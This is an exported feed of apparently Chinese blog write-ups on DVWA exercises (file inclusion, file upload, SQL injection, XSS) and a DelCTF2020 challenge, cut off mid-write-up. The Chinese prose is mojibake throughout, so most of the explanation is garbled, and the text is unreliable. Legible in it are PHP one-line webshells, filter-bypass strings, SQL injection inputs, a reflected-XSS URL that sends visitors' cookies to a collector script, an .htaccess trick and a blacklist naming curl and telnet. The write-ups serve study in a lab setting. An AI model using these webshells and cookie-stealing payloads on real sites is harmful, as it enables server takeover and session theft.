<li>phpä¸­å¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´çš„é€šå¸¸æ˜¯ä»¥ä¸‹å››ä¸ªå‡½æ•°</li>
</ul>
<blockquote>
<p>include()ï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«æ–‡ä»¶ï¼ŒæŠ¥é”™ï¼Œä½†ä¼šç»§ç»­è¿è¡Œè„šæœ¬ï¼›</p>
<p>include_once()ï¼šä¸includeï¼ˆï¼‰ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºï¼Œå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ï¼›</p>
<p>require()ï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«æ–‡ä»¶ï¼ŒæŠ¥é”™ï¼Œå¹¶ä¸”åœæ­¢è¿è¡Œè„šæœ¬ï¼›</p>
<p>require_once()ï¼šä¸requireç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºï¼Œå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ï¼›</p>
</blockquote>
<ul>
<li>æ–‡ä»¶åŒ…å«çš„ç‰¹å¾</li>
</ul>
<blockquote>
<p>ï¼Ÿpage=</p>
<p>ï¼Ÿfile=</p>
<p>ï¼Ÿhome=</p>
</blockquote>
<h6 id="lowç­‰çº§-3"><a href="#lowç­‰çº§-3" class="headerlink" title="lowç­‰çº§"></a>lowç­‰çº§</h6><p><strong>æœ¬åœ°æ–‡ä»¶åŒ…å«</strong></p>
<p>æŸ¥çœ‹æºä»£ç </p>
<img src="http://img.kawhi.xyz/image-20200314171409981.png" alt="image-20200314171409981" style="high:80%;width:80%;" />

<blockquote>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ç«¯å¯¹pageå‚æ•°æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤è·Ÿæ£€æŸ¥</p>
<p>æ¥ä¸‹æ¥ç»™pageå‚æ•°éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿ï¼ŒæŠ¥é”™ä¹‹åå°±å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨çš„ç»å¯¹è·¯å¾„</p>
<p>å¯ä»¥è½»æ˜“è·å¾—phpinfoçš„ä¿¡æ¯</p>
</blockquote>
<img src="http://img.kawhi.xyz/image-20200314172226523.png" alt="image-20200314172226523" style="high:80%;width:80%;" />

<p><strong>è¿œç¨‹æ–‡ä»¶åŒ…å«</strong></p>
<blockquote>
<p>æˆ‘åœ¨phpstudyçš„wwwç›®å½•ä¸‹æ”¾äº†ä¸€ä¸ªphpinfo.txtæ–‡ä»¶ï¼ŒåŒæ ·æ˜¯å¯ä»¥è¯»å–çš„ã€‚</p>
<p>è¯´æ˜è¿™ä¸ªæ¼æ´å¯ä»¥æ‰§è¡Œè¿œç¨‹æ–‡ä»¶ï¼Œè€Œä¸”éphpæ ¼å¼æ–‡ä»¶éƒ½å¯ä»¥æ‰§è¡Œ</p>
</blockquote>
<img src="http://img.kawhi.xyz/image-20200314172507620.png" alt="image-20200314172507620" style="high:80%;width:80%;" />

<h6 id="Mediumç­‰çº§-3"><a href="#Mediumç­‰çº§-3" class="headerlink" title="Mediumç­‰çº§"></a>Mediumç­‰çº§</h6><p>æŸ¥çœ‹ä¸€ä¸‹æºç </p>
<img src="http://img.kawhi.xyz/image-20200314172841792.png" alt="image-20200314172841792" style="high:80%;width:80%;" />

<blockquote>
<p>çœ‹æºç å¯çŸ¥ï¼šMediumçº§åˆ«ä½¿ç”¨äº†str_replaceå‡½æ•°å°†â€œhttp://â€ï¼Œâ€œhttps://â€ï¼Œâ€œ../â€ï¼Œâ€œ..\â€æ›¿æ¢ä¸ºç©º</p>
<p>å¯ä»¥ä½¿ç”¨â€œhttphttp://://â€, â€œâ€¦/./â€,â€file:///â€æ–¹å¼ç»•è¿‡</p>
</blockquote>
<h6 id="Highç­‰çº§-3"><a href="#Highç­‰çº§-3" class="headerlink" title="Highç­‰çº§"></a>Highç­‰çº§</h6><blockquote>
<p>æŸ¥çœ‹æºç ä¹‹åå‘ç°pageå‚æ•°å¿…é¡»ä»¥fileå¼€å¤´</p>
<p>ç›´æ¥ä½¿ç”¨file:///æ–¹å¼ç»•è¿‡å³å¯</p>
</blockquote>
<h6 id="Impossibleç­‰çº§-3"><a href="#Impossibleç­‰çº§-3" class="headerlink" title="Impossibleç­‰çº§"></a>Impossibleç­‰çº§</h6><blockquote>
<p>æŸ¥çœ‹æºä»£ç å¯çŸ¥</p>
<p>Impossibleçº§åˆ«ä¸­ï¼Œpageå‚æ•°åªèƒ½æ˜¯å¦‚ä¸Šå››ç§ï¼Œinclude.php,file1.php,file2.php,file3.phpï¼›æœç»äº†æ–‡ä»¶åŒ…å«æ¼æ´</p>
</blockquote>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
  </entry>
  <entry>
    <title>DVWAç»ƒä¹ â…¡</title>
    <url>/2020/03/15/DVWA%E7%BB%83%E4%B9%A0%E2%85%A1/</url>
    <content><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a><strong>æ–‡ä»¶ä¸Šä¼ </strong></h1><ul>
<li><strong>æ–‡ä»¶ä¸Šä¼ æ¼æ´</strong></li>
</ul>
<p>é€šå¸¸æ˜¯ç”±äºå¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å†…å®¹æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æœ¨é©¬è·å–æœåŠ¡å™¨çš„webshellæƒé™</p>
<ul>
<li><strong>æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å‰ææ¡ä»¶</strong></li>
</ul>
<p>èƒ½ä¸Šä¼ æœ¨é©¬ï¼Œä¸Šä¼ çš„æœ¨é©¬èƒ½æ‰§è¡Œï¼Œè¿˜è¦æ¸…æ¥šä¸Šä¼ åçš„è·¯å¾„</p>
<h2 id="lowç­‰çº§"><a href="#lowç­‰çº§" class="headerlink" title="lowç­‰çº§"></a>lowç­‰çº§</h2><p>è¿™é‡Œç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬<?php @eval($_Post[cmd]);?></p>
<img src="http://img.kawhi.xyz/image-20200315103605319.png" alt="image-20200315103605319" style="high:80%;width:80%;" />

<p>å¯ä»¥å¾—çŸ¥æœ¨é©¬æ–‡ä»¶çš„è·¯å¾„ä¸º</p>
<p><a href="http://192.168.0.105/DVWA-1.9/hackable/uploads/cmd.php">http://192.168.0.105/DVWA-1.9/hackable/uploads/cmd.php</a></p>
<p>æŠŠæœ¨é©¬çš„è·¯å¾„ä¸Šä¼ ä¸­å›½èœåˆ€å°±å¯ä»¥è·å¾—æœåŠ¡å™¨ç›®å½•äº†</p>
<img src="http://img.kawhi.xyz/image-20200315121026444.png" alt="image-20200315121026444" style="high:80%;width:80%;" />

<h2 id="Mediumç­‰çº§"><a href="#Mediumç­‰çº§" class="headerlink" title="Mediumç­‰çº§"></a><strong>Mediumç­‰çº§</strong></h2><p>æŸ¥çœ‹ä¸€ä¸‹æºç </p>
<img src="http://img.kawhi.xyz/image-20200315110940498.png" alt="image-20200315110940498" style="high:80%;width:80%;" />

<p>å‘ç°é™åˆ¶äº†æ–‡ä»¶ç±»å‹å¿…é¡»æ˜¯jpegæˆ–è€…æˆ–è€…pngï¼ŒåŒæ—¶æ–‡ä»¶å¤§å°å¿…é¡»å°äº100000å­—èŠ‚ã€‚</p>
<p><strong>BurpSuiteæŠ“åŒ…ä¿®æ”¹content-type</strong></p>
<img src="http://img.kawhi.xyz/image-20200315163240649.png" alt="image-20200315163240649" style="high:80%;width:80%;" />

<p>å¯ä»¥åœ¨å¤§ç®­å¤´å¤„æŠŠpngä¿®æ”¹ä¸ºphpå³å¯æˆåŠŸä¸Šä¼ ï¼Œèœåˆ€ä½¿ç”¨å’Œlowç­‰çº§ä¸€æ ·</p>
<p>ä¹Ÿå¯ä¿®æ”¹å°ç®­å¤´å¤„æŠŠç±»å‹ä¿®æ”¹ä¸ºapplication/octet-stream</p>
<p>å¦‚æœç›´æ¥ä¸Šä¼ äº†a.pngï¼Œèœåˆ€å°±è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«çš„å½¢å¼å³ï¼š</p>
<p><a href="http://192.168.0.105/DVWA-1.9/vulnerabilities/fi/?page=httphttp://://192.168.0.105/DVWA-1.9/hackable/uploads/a.png">http://192.168.0.105/DVWA-1.9/vulnerabilities/fi/?page=httphttp://://192.168.0.105/DVWA-1.9/hackable/uploads/a.png</a></p>
<p>å› ä¸ºæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸ç®¡æ–‡ä»¶åç¼€æ˜¯å¦æ˜¯phpï¼Œéƒ½ä¼šå°è¯•å½“åšphpæ–‡ä»¶æ‰§è¡Œã€‚</p>
<h2 id="Highç­‰çº§"><a href="#Highç­‰çº§" class="headerlink" title="Highç­‰çº§"></a><strong>Highç­‰çº§</strong></h2><img src="http://img.kawhi.xyz/image-20200315164336513.png" alt="image-20200315164336513" style="high:80%;width:80%;" />

<p>é€šè¿‡æŸ¥çœ‹æºç å‘å…ˆä¾æ—§é‡‡ç”¨ç™½åå•è¿‡æ»¤ï¼Œåªå…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€åä¸ºjpgã€jpegã€pngã€‚</p>
<p>ä½†æ˜¯ä¼šè¯»å–æ–‡ä»¶å¤´ï¼Œè¿”å›å›¾ç‰‡çš„é•¿ã€å®½ç­‰ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰ç›¸å…³çš„å›¾ç‰‡æ–‡ä»¶å¤´ï¼Œä¼šæŠ¥é”™ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨å›¾ç‰‡éšå†™çš„æ–¹å¼æŠŠä¸€å¥è¯æœ¨é©¬å†™åˆ°å›¾ç‰‡é‡Œé¢å†ä¸Šä¼ ï¼Œå†åˆ°èœåˆ€é‡Œé¢ä½¿ç”¨æ–‡ä»¶åŒ…å«çš„å½¢å¼æ‰“å¼€</p>
<p>å›¾ç‰‡å³å¯è·å–webshell</p>
<h2 id="Impossibleç­‰çº§"><a href="#Impossibleç­‰çº§" class="headerlink" title="Impossibleç­‰çº§"></a><strong>Impossibleç­‰çº§</strong></h2><img src="http://img.kawhi.xyz/image-20200315164841208.png" alt="image-20200315164841208" style="high:80%;width:80%;" />

<p>å¯ä»¥çœ‹åˆ°åŠ å…¥äº†tokenï¼Œä»¥åŠå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œäº†é‡å‘½åï¼Œå½»åº•æœç»äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚</p>
<h1 id="SQLå›æ˜¾æ³¨å…¥"><a href="#SQLå›æ˜¾æ³¨å…¥" class="headerlink" title="SQLå›æ˜¾æ³¨å…¥"></a><strong>SQLå›æ˜¾æ³¨å…¥</strong></h1><hr>
<ul>
<li><strong>SQLæ³¨å…¥æ¼æ´åŸç†</strong></li>
</ul>
<p>å°†æ¶æ„çš„SQLè¯­å¥æ‹¼æ¥åˆ°åˆæ³•çš„è¯­å¥ä¸­ï¼Œä»è€Œè¾¾åˆ°æ‰§è¡ŒSQLè¯­å¥çš„ç›®çš„</p>
<ul>
<li><strong>SQLæ³¨å…¥æ¼æ´ç±»å‹</strong></li>
</ul>
<p>å­—ç¬¦å‹,æ•°å­—å‹,æœç´¢å‹ã€‚</p>
<ul>
<li><strong>æ³¨å…¥çš„åŸºæœ¬æµç¨‹</strong></li>
</ul>
<p>â‘ åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</p>
<p>â‘¡çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°</p>
<p>â‘¢ç¡®å®šå›æ˜¾ä½ç½®</p>
<p>â‘£è·å–å½“å‰æ•°æ®åº“ï¼Œè·å–æ•°æ®åº“ä¸­è¡¨</p>
<p>â‘¤è·å–è¡¨ä¸­çš„å­—æ®µå</p>
<p>â‘¥è·å–æ•°æ®</p>
<h2 id="lowç­‰çº§-1"><a href="#lowç­‰çº§-1" class="headerlink" title="lowç­‰çº§"></a><strong>lowç­‰çº§</strong></h2><p>ä¾æ¬¡å°è¯•1â€™ or â€˜1â€™=â€™1ï¼Œ1 or 1=1ï¼Œ1â€œ or â€œ1â€=â€1ä¸‰ç§ï¼Œå‘ç°å˜é‡çš„å¤–é¢ä¸ºå•å¼•å·ã€‚å­˜åœ¨å­—ç¬¦å‹SQLæ³¨å…¥ã€‚</p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥æŸ¥è¯¢æ•°æ®åº“ï¼Œç”¨æˆ·åç­‰ç­‰ç”šè‡³å¯ä»¥å†™å…¥Webshellï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€å°è¯•äº†ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200315170643403.png" alt="image-20200315170643403" style="high:80%;width:80%;" />

<h2 id="Mediumç­‰çº§-1"><a href="#Mediumç­‰çº§-1" class="headerlink" title="Mediumç­‰çº§"></a><strong>Mediumç­‰çº§</strong></h2><p>æŸ¥çœ‹æºä»£ç </p>
<img src="http://img.kawhi.xyz/image-20200315171449765.png" alt="image-20200315171449765" style="high:80%;width:80%;" />

<p>å‘ç°åˆ©ç”¨mysql_real_escape_string()å‡½æ•°è½¬ä¹‰äº†sqlçš„ç‰¹æ®Šç¬¦å·</p>
<p>è€Œä¸”è®¾ç½®äº†ä¸‹æ‹‰æ¡†ï¼Œæ§åˆ¶ç”¨æˆ·è¾“å…¥</p>
<img src="http://img.kawhi.xyz/image-20200315171807295.png" alt="image-20200315171807295" style="high:80%;width:80%;" />

<p>è¿™é‡Œç›´æ¥burp suiteæŠ“åŒ…æ”¹å€¼å³å¯</p>
<p>å¦‚æœé‡åˆ°æœ‰çš„åœ°æ–¹éœ€è¦å•å¼•å·ï¼Œå¯ä»¥ä½¿ç”¨hexç¼–ç è½¬æ¢ä¸€ä¸‹å³å¯</p>
<h2 id="Highç­‰çº§-1"><a href="#Highç­‰çº§-1" class="headerlink" title="Highç­‰çº§"></a><strong>Highç­‰çº§</strong></h2><p>Highçº§åˆ«åœ¨SQLæŸ¥è¯¢è¯­å¥ä¸­æ·»åŠ äº†LIMIT 1ï¼Œä»¥æ­¤æ§åˆ¶åªè¾“å…¥ä¸€ä¸ªç»“æœã€‚</p>
<p>è™½ç„¶æ·»åŠ äº†LIMIT 1ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡â€“ å°†å…¶æ³¨é‡Šæ‰å³å¯ã€‚</p>
<p>å…¶ä»–æ“ä½œå’Œlowä¸€è‡´</p>
<h2 id="Impossibleç­‰çº§-1"><a href="#Impossibleç­‰çº§-1" class="headerlink" title="Impossibleç­‰çº§"></a><strong>Impossibleç­‰çº§</strong></h2><img src="http://img.kawhi.xyz/image-20200315174243384.png" alt="image-20200315174243384" style="high:80%;width:80%;" />

<p>æŸ¥çœ‹æºç ä½¿ç”¨äº†PDOï¼Œåˆ’æ¸…äº†ä»£ç ä¸æ•°æ®çš„ç•Œé™ï¼Œæœ‰æ•ˆé˜²å¾¡SQLæ³¨å…¥ã€‚</p>
<h1 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a><strong>SQLç›²æ³¨</strong></h1><ul>
<li><strong>ç›²æ³¨</strong></li>
</ul>
<p>è¿™é‡Œçš„ç›²æ³¨ä¸åŒäºå›æ˜¾æ³¨å…¥ï¼Œä»–åªä¼šè¿”å›ä¸¤ç§ç»“æœæ˜¯æˆ–è€…ä¸æ˜¯</p>
<p>å³User ID exists in the databaseæˆ–è€…User ID is MISSING from the databaseã€‚</p>
<h2 id="lowç­‰çº§-2"><a href="#lowç­‰çº§-2" class="headerlink" title="lowç­‰çº§"></a><strong>lowç­‰çº§</strong></h2><p>è¿™é‡Œåˆ†åˆ«è¯•éªŒ1 and 1=2ï¼Œ1â€™and â€˜1â€™=â€™2ï¼Œ1â€ and â€œ1â€=â€2ã€‚æœ€ç»ˆ1â€™and â€˜1â€™=â€™2æŠ¥é”™è¯´æ˜å‚æ•°æ˜¯å•å¼•å·åœ¨å¤–é¢çš„ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨è¯¸å¦‚æ­¤ç±»çš„å¦‚ï¼š1â€™ and length(database())&gt;1ï¼Œé€æ­¥é€šè¿‡æ­£ç¡®è¿˜æ˜¯é”™è¯¯åˆ¤æ–­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚è¿™é‡Œå°±ä¸ä¸€ä¸€è¯•éªŒäº†ã€‚</p>
<h2 id="Mediumç­‰çº§-2"><a href="#Mediumç­‰çº§-2" class="headerlink" title="Mediumç­‰çº§"></a><strong>Mediumç­‰çº§</strong></h2><p>æŸ¥çœ‹æºä»£ç å‘ç°ä½¿ç”¨äº†mysql_real_escape_string()å‡½æ•°ï¼Œæ“ä½œå’Œå›æ˜¾æ³¨å…¥å·®ä¸å¤š</p>
<h2 id="Highç­‰çº§-2"><a href="#Highç­‰çº§-2" class="headerlink" title="Highç­‰çº§"></a><strong>Highç­‰çº§</strong></h2><p>é™åˆ¶äº†è¾“å…¥çš„é•¿åº¦ä¸º1ï¼Œåœ¨è¾“å…¥çš„æœ€ååŠ ä¸ª#ï¼Œå°±å¯ä»¥æ³¨é‡Šæ‰æºç ä¸­çš„limit 1</p>
<h2 id="Impossibleç­‰çº§-2"><a href="#Impossibleç­‰çº§-2" class="headerlink" title="Impossibleç­‰çº§"></a><strong>Impossibleç­‰çº§</strong></h2><p>å’Œå›æ˜¾æ³¨å…¥ä¸€æ ·ä½¿ç”¨äº†PDOï¼Œæœ‰æ•ˆé˜²å¾¡äº†æ³¨å…¥çš„æ¼æ´ã€‚</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><strong>XSS</strong></h1><p>XSSç®€ä»‹</p>
<p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé€šè¿‡webç«™ç‚¹æ¼æ´ï¼Œå‘å®¢æˆ·ç«¯äº¤ä»˜æ¶æ„è„šæœ¬ä»£ç ï¼Œè¿™äº›ä»£ç å¯ä»¥è¢«æµè§ˆå™¨æˆåŠŸçš„æ‰§è¡Œï¼Œä»è€Œå®ç°å¯¹å®¢æˆ·ç«¯çš„æ”»å‡»ã€‚XSSåˆåˆ†ä¸ºå­˜å‚¨å‹å’Œæ”¾å°„å‹ä¸¤ç§ã€‚</p>
<h2 id="lowç­‰çº§-3"><a href="#lowç­‰çº§-3" class="headerlink" title="lowç­‰çº§"></a><strong>lowç­‰çº§</strong></h2><ul>
<li><strong>å¼¹çª—</strong></li>
</ul>
<p>ç›´æ¥è¾“å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="http://img.kawhi.xyz/image-20200315200324914.png" alt="image-20200315200324914" style="high:80%;width:80%;" />

<ul>
<li><strong>è·å–cookie</strong></li>
</ul>
<p>è¿™é‡Œæ–°å»ºä¸€ä¸ªcookie.phpæ–‡ä»¶æ”¾åœ¨wwwçš„ç›®å½•ä¸‹</p>
<p>ç„¶åè®©ç”¨æˆ·ç‚¹å‡»å¸¦æœ‰jsè„šæœ¬çš„urlï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">http://192.168.0.100/DVWA-1.9/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=&#x27;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç”¨æˆ·ç‚¹å‡»ä¹‹åæˆ‘ä»¬wwwçš„ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆcookie.txtæ–‡ä»¶ï¼ŒæˆåŠŸè·å–ç”¨æˆ·çš„cookieå€¼ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200315204539470.png" alt="image-20200315204539470" style="high:80%;width:80%;" />

<p>å†ä¿®æ”¹åˆšåˆšè·å–çš„cookieå€¼æ”¾è¿›å»å°±å¯ä»¥ä»¥adminçš„èº«ä»½è¿›å…¥ã€‚</p>
<h2 id="Mediumç­‰çº§-3"><a href="#Mediumç­‰çº§-3" class="headerlink" title="Mediumç­‰çº§"></a><strong>Mediumç­‰çº§</strong></h2><p>æŸ¥çœ‹æºä»£ç </p>
<img src="http://img.kawhi.xyz/image-20200315205547446.png" alt="image-20200315205547446" style="high:80%;width:80%;" />

<p>å‘ç°scriptæ ‡ç­¾è¢«æ›¿æ¢ä¸ºç©ºäº†</p>
<p>ä½¿ç”¨åµŒå¥—å³å¯ç»•è¿‡å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æˆ–è€…å¤§å°å†™æ··åˆä¹Ÿå¯</p>
<h2 id="Highç­‰çº§-3"><a href="#Highç­‰çº§-3" class="headerlink" title="Highç­‰çº§"></a><strong>Highç­‰çº§</strong></h2><p>æŸ¥çœ‹æºä»£ç </p>
<img src="http://img.kawhi.xyz/image-20200315211243037.png" alt="image-20200315211243037" style="high:80%;width:80%;" />

<p>ä½¿ç”¨preg_replace() å‡½æ•°ç”¨äºæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œå°†scriptå‰åç›¸å…³çš„å†…å®¹éƒ½æ›¿æ¢ä¸ºç©ºï¼Œä½¿å¾—åŒå†™ç»•è¿‡ã€å¤§å°å†™æ··æ·†ç»•è¿‡ä¸å†æœ‰æ•ˆã€‚</p>
<p>ä½†æ˜¯å¯ä»¥é€šè¿‡imgã€bodyç­‰æ ‡ç­¾äº‹ä»¶æˆ–è€…iframeç­‰æ ‡ç­¾çš„srcæ³¨å…¥æ¶æ„çš„jsä»£ç ã€‚</p>
<h2 id="Impossibleç­‰çº§-3"><a href="#Impossibleç­‰çº§-3" class="headerlink" title="Impossibleç­‰çº§"></a><strong>Impossibleç­‰çº§</strong></h2><p>ä½¿ç”¨htmlspecialcharså‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦&amp;ã€â€ã€ â€™ã€&lt;ã€&gt;è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢æµè§ˆå™¨å°†å…¶ä½œä¸ºHTMLå…ƒç´ ï¼ˆç‰¹æ®Šæ„ä¹‰ï¼‰ï¼Œæœ‰æ•ˆé˜²æ­¢äº†åå°„å‹XSSæ”»å‡»</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
  </entry>
  <entry>
    <title>DelCTF2020</title>
    <url>/2020/05/08/DelCTF2020/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h4><p>é¢˜ç›®å¯¹æˆ‘æ¥è¯´å¤ªéš¾ï¼Œåªå¤ç°äº†ä¸¤é“é¢˜ç›®ã€‚</p>
<h4 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a><strong>Check In</strong></h4><p>ä¸€é“ä¸Šä¼ æ¼æ´é¢˜ï¼Œä¼šæ£€æŸ¥<code>Content-Type</code>å’Œæ–‡ä»¶åç¼€é»‘åå•ï¼Œè¿™ä¸ªé—®é¢˜ä¸å¤§ã€‚</p>
<p>ç„¶åå‘ç°è¿‡æ»¤æ–‡ä»¶å†…å®¹é»‘åå•ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ä¸€å¥è¯æœ¨é©¬éœ€è¦ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œå³ä¸Šä¼ <code>1.jpg</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¸Šä¼ <code>.htaccess</code>è§£æ<code>1.jpg</code>ï¼Œè¿™é‡Œç”¨æ¢è¡Œç¬¦ç»•è¿‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸè¿æ¥ä¸Šèšå‰‘ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200506153323919.png" style="high:100%;width:100%;" />

<h4 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h4><p>é¢˜ç›®ç›´æ¥ç»™å‡ºäº†æºä»£ç ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox = <span class="string">&quot;uploads/&quot;</span>. md5(<span class="string">&quot;De1CTF2020&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="meta">@mkdir($sandbox);</span></span><br><span class="line"><span class="meta">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&quot;submit&quot;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            die($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;_&quot;</span>.$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $filename);</span><br><span class="line">            echo <span class="string">&quot;save in:&quot;</span> . $sandbox.<span class="string">&quot;/&quot;</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;Not Allow!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts = array(<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    $ext = explode(<span class="string">&quot;.&quot;</span>, $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9;~^`&amp;|]/is&#x27;</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">&#x27;/\.\./&#x27;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> true;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„checkå‡½æ•°å¯¹æ–‡ä»¶çš„å†…å®¹è¿‡æ»¤äº†å­—æ¯æ•°å­—ä»¥åŠä¸€äº›ç¬¦å·ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æ— å­—ç¬¦æ•°å­—RCEç»•è¿‡ï¼Œå…·ä½“å‚è€ƒï¼š<a class="foo" href="https://0xparrot.github.io/ctf/2020/05/05/PHP-Webshell-without-alphanumeric-and-semi-colon/" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™é‡Œç›´æ¥ä¸Šä¼ <code>6.Php</code></p>
<p>å†…å®¹ä¸ºï¼š</p>
